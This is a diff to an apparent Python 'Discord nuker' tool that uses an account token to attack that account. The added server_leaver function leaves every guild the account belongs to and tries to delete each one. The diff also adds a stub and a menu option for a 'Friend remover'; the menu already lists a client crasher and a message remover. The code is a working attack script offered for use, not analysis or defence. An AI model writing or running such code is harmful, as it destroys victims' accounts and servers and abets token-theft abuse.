@@ -30,7 +30,17 @@ class attacks():
                 break
     
     def server_leaver(token):
-        pass
+        headers = {
+            "authorization": token
+        }
+        guilds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers).json()
+        for guild in guilds:
+            try:
+                requests.delete("https://discord.com/api/v10/users/@me/guilds/{}".format(guild["id"]), headers=headers)
+                requests.delete("https://discord.com/api/v10/guilds/{}".format(guild["id"]), headers=headers)
+                print("[*] Leaving guild [SERVER: {}]".format(guild["name"]))
+            except:
+                break
     
     def message_remover(token):
         headers = {
@@ -55,6 +65,9 @@ class attacks():
                             loop = False
             except:
                 break
+            
+    def friend_remover(token):
+        pass
 
 os.system("cls")
 
@@ -73,6 +86,8 @@ def main():
     print("[1] Client crasher")
     print("[2] Server leaver")
     print("[3] Message remover")
+    print("[4] Friend remover")
+
 
     time.sleep(1)
     attack = int(input("\n[?] Select attack: "))
@@ -94,6 +109,13 @@ def main():
     elif attack == 3:
         os.system("cls")
         attacks.message_remover(token)
+        input("\n[*] Attack executed, press enter to continue.. ")
+        time.sleep(1)
+        os.system("cls")
+        main()
+    elif attack == 4:
+        os.system("cls")
+        attacks.friend_remover(token)
         input("\n[*] Attack executed, press enter to continue.. ")
         time.sleep(1)
         os.system("cls")
